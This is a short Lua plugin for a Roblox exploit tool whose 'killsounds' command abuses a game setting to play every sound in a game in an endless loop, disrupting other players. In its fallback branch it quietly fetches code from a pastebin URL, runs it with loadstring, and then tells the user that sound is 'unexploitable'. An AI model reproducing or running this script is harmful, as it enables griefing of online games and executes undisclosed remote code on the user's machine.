local Plugin = {
	["PluginName"] = "Kill Sounds",
	["PluginDescription"] = "kills the roblox sounds",
	["Commands"] = {
		["killsounds"] = {
			["ListName"] = "killsounds / ks",
			["Description"] = "kills the roblox sounds",
			["Aliases"] = { "ks" },
			["Function"] = function(args, speaker)
				if game.SoundService.RespectFilteringEnabled == false then
					while wait(1) do
						for i, v in pairs(game:GetDescendants()) do
							if v:IsA("Sound") then
								v:Play()
							end
						end
					end
				else
					loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ts8TSAZN", 0, true))()
					notify("Sound is unexploitable.", warn(":("))
				end
			end,
		},
	},
}

return Plugin
